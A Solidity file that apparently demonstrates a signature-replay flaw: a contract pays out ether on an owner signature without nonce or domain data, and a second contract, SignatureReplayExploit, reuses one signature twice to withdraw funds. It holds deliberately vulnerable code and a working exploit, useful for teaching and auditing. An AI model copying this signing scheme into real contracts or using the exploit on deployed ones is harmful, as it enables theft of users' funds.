// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract SignatureReplay {
    address public immutable owner;
    bool private locked;

    constructor() payable {
        owner = msg.sender;
    }

    modifier lock() {
        require(!locked, "locked");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
        external
        lock
    {
        require(verify(to, amount, r, s, v), "invalid signature");
        payable(to).transfer(amount);
    }

    function getHash(address to, uint256 amount)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(to, amount));
    }

    function getEthHash(bytes32 h) public pure returns (bytes32) {
        return
            keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
    }

    function verify(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
        public
        view
        returns (bool)
    {
        bytes32 h = getHash(to, amount);
        bytes32 ethHash = getEthHash(h);
        return ecrecover(ethHash, v, r, s) == owner;
    }
}

interface ISignatureReplay {
    function withdraw(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
        external;
}

contract SignatureReplayExploit {
    ISignatureReplay immutable target;

    constructor(address _target) {
        target = ISignatureReplay(_target);
    }

    receive() external payable {}

    function pwn(bytes32 r, bytes32 s, uint8 v) external {
        target.withdraw(msg.sender, 1e18, r, s, v);
        target.withdraw(msg.sender, 1e18, r, s, v);
    }
}
